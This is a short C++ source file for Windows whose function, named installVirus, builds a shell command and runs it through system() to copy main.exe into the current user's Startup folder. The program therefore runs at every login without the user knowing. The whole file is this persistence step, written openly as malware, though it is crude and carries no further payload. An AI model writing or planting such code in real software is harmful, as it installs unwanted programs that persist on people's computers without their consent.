#include <stdlib.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <direct.h>
#define GetCurrentDir _getcwd
#include<iostream>

using namespace std;

string get_current_dir() {
   char buff[FILENAME_MAX]; //create string buffer to hold path
   GetCurrentDir( buff, FILENAME_MAX );
   string current_working_dir(buff);
   return current_working_dir;
}

void installVirus()
{
    string dir = get_current_dir();
    string tempString = "cd " + dir + " && copy main.exe \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
    const char *cmd = tempString.c_str();
    cout << "command" << cmd;
    system(cmd);
    cout << dir << endl;
    //copies main.exe to startup folder
}

int main()
{
    installVirus();
}